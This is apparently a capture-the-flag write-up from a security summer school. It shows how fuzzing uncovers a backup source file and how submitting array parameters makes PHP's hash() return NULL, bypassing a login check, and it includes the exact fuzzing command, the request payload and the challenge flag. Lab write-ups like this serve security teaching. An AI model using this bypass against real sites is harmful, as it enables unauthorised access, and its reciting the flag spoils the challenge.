---
Name: "Breaking Hashes"
Category: "Security Summer School"
Difficulty: "Medium"
Description: "Bypassing a weak PHP hash comparison by submitting array parameters."
---

# Breaking Hashes
Looking at the page source we find a note
```html
<!-- TODO: Remove source.phar -->
```

source.phar is not found, but while fuzzing for other extensions we find source.bak
```bash
ffuf -u http://sss.upb:8000/sourceFUZZ \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-extensions.txt \
     -mc 200,204,301,302,307,401,403
```
```bash
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sss.upb:8000/sourceFUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.bak                    [Status: 200, Size: 327, Words: 30, Lines: 10, Duration: 1538ms]
:: Progress: [1290/1290] :: Job [1/1] :: 45 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

In order to get the flag we have to provide a username and password pair that produces the same SHA-256 hash, while ensuring the username is different from the password. Finding a SHA-256 collision is almost impossible
```php
<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
	if ($_POST['username'] == $_POST['password']) {
		$error = 'Your password can not be your username!';
	} else if (hash('sha256', $_POST['username']) === hash('sha256', $_POST['password'])) {
		die($flag);
	} else {
		$error = 'Invalid credentials!';
	}
}
```

By submitting the parameters as arrays the hash() function returns NULL because it receives an invalid argument type
```http
POST / HTTP/1.1
Host: sss.upb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://sss.upb:8000
Connection: keep-alive
Referer: http://sss.upb:8000/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username[]=a&password[]=b&submit=Login
```

And get the flag along with some error messages
```bash
Warning: hash() expects parameter 2 to be string, array given in /var/www/html/index.php on line 10

Warning: hash() expects parameter 2 to be string, array given in /var/www/html/index.php on line 10

SSS{arr4ys_c4n_b3_n4sty_if_n0t_ch3ck3d}
```

